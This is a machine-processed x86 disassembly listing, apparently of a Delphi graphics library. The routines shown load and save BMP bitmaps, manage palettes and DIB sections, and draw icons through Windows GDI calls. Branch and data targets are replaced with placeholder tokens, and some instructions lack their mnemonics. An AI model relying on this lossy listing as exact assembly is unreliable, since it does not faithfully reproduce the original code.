call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_429204
pop edx
pop edi
pop esi
pop ebx
retn
sub_428c9c
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4027b4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_4291b9
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_42918c
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c58
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_424140
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41c114
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c58
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41c0a4
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_4243d0
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_4243f0
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41c0a4
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_424260
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_429107
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_424698
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4027b4
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_42906f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41c0a4
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_424260
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_429043
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_424950
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cec4
call sub_424140
jmp r-xdata
xor eax eax
push ebp
push sub_4290d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41c0a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42904a
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42910e
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cec4
call sub_424140
jmp r-xdata
sub_42904a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4027d4
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42910e
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c58
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4291a3
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_424950
mov [ ebp - 0x30 ] eax
sub_4291c0
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_428b74
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429204
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_428904
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41c0a4
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c58
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428b74
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_428c9c
call sub_424140
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_429274
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_428904
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c58
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_427f1c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42930f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_428b74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429338
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4287c0
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_428904
mov eax esi
call sub_428a14
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_428904
mov eax esi
call sub_428a14
mov eax esi
call sub_428890
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_427f1c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_428320
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428b74
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428b74
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_4278b8
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429470
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_428914
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428320
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4294c4
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_428914
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_428320
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429544
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_428904
mov eax ebx
call sub_428914
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_4278b8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4295db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428b74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4277b0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_4221c4
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_4295e0
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a00
call sub_403a54
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4277b0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429618
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_428914
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428320
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429674
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c58
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_428890
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_4250a4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41c0dc
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41c0dc
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c58
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_428754
mov dl [ r-xdata ]
call sub_423f3c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_424260
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_42786c
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41c0dc
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41c0dc
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41c0dc
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41c0dc
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41c0dc
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41c0dc
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_4246d0
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41c0dc
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_4249f4
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42992c
push ebx
mov ebx eax
mov eax ebx
call sub_428914
mov edx ebx
mov eax ebx
call sub_4283e0
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
mov ecx edx
cmp edx [ eax + 0x14 ]
jne r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ecx
pop ebx
retn
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x2c ] edx
sub_429960
push ebx
mov ebx eax
mov eax ebx
call sub_428914
mov edx ebx
mov eax ebx
call sub_4283e0
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x10 ]
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov eax edx
pop ebx
retn
sub_42998c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_428914
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4278b8
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_429a06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_427f1c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429a2c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_429a74
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4253e0
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_4276e4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_429ac8
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_4276e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a7b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_429af8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_429dd0
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_4276e4
mov eax [ esi + 0x28 ]
call sub_4276e8
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41a7dc
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_429b58
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_423f3c
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_429bb0
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_429bec
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41be98
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41c0a4
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_424ca0
jmp r-xdata
jmp r-xdata
call sub_42414c
sub_429c64
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429cf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_429bb0
cmp eax [ rw-data ]
jne r-xdata
call sub_42414c
mov eax esi
call sub_429bb0
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4251e4
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c58
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41c0dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_429d18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429da6
push [ fs : eax ]
